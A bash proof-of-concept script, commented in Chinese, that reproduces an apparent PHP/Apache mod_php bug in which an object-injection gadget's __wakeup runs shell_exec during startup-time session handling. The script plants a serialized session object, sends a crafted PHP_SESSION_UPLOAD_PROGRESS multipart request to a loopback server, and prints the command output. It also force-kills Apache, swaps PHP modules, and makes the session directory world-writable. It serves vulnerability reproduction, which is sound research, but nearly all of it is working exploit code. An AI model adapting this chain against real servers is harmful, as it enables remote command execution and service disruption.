#!/bin/bash
# 109619-A 复现：启动期 __wakeup → 命令执行
# 用法：sudo bash demo_wakeup.sh
# 需要：Apache2 + mod_php（未修复版本）、可写的 DOCROOT 和 SESSION_DIR
set -e

DOCROOT=${DOCROOT:-/var/www/lab}
SESSION_DIR=${SESSION_DIR:-$DOCROOT/sess}
MODULE=${MODULE:-/usr/lib/apache2/modules/libphp.so}
PHP_INI_DIR=${PHP_INI_DIR:-/etc/php/lab}
SID=${SID:-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}

mkdir -p "$DOCROOT" "$SESSION_DIR" "$PHP_INI_DIR"
chmod 777 "$SESSION_DIR"

echo "=== [1/5] preload 里的 gadget 类 ==="
cat > "$DOCROOT/preload.php" <<'PHP'
<?php
class DemoGadget {
    public $a;
    public function __wakeup() {
        @file_put_contents(__DIR__ . '/proof.txt',
            "pid=" . getmypid() . "\n" . @shell_exec('id; hostname') . "\n", FILE_APPEND);
    }
}
PHP
chmod 644 "$DOCROOT/preload.php"

cat > "$PHP_INI_DIR/php.ini" <<EOF
opcache.enable=1
opcache.preload=$DOCROOT/preload.php
opcache.preload_user=www-data
EOF

echo "=== [2/5] 载入漏洞版模块 ==="
cat > /etc/apache2/mods-available/php-lab.load <<EOF
LoadModule php_module $MODULE
EOF
a2dismod php  >/dev/null 2>&1 || true
a2dismod php7 >/dev/null 2>&1 || true
a2enmod php-lab >/dev/null 2>&1 || true

echo "=== [3/5] 起 Apache（回环 :8099） ==="
pkill -9 -x apache2 2>/dev/null || true; sleep 1
rm -f /var/run/apache2/apache2.pid
: > "$DOCROOT/proof.txt"; chmod 666 "$DOCROOT/proof.txt"
rm -f "$SESSION_DIR"/sess_*
source /etc/apache2/envvars
setsid /usr/sbin/apache2 -DFOREGROUND > /tmp/apache-lab.log 2>&1 &
sleep 3

echo "=== [4/5] 写一个含对象的会话 + 发一次 multipart ==="
printf 'data|O:12:"DemoGadget":1:{s:1:"a";s:1:"b";}' > "$SESSION_DIR/sess_$SID"
chmod 666 "$SESSION_DIR/sess_$SID"

BODY=/tmp/upload_progress.bin
{
  printf -- '------probe\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
  printf -- '------probe\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\nContent-Type: text/plain\r\n\r\nAB\r\n'
  printf -- '------probe--\r\n'
} > "$BODY"

curl -s -m 20 -o /dev/null -w '   HTTP %{http_code}\n' \
  -b "PHPSESSID=$SID" \
  -H 'Content-Type: multipart/form-data; boundary=----probe' \
  --data-binary @"$BODY" \
  "http://127.0.0.1:8099/index.php"

echo "=== [5/5] 证据 ==="
cat "$DOCROOT/proof.txt" 2>/dev/null || echo "  （无输出：可能已修复，或 preload 没生效）"
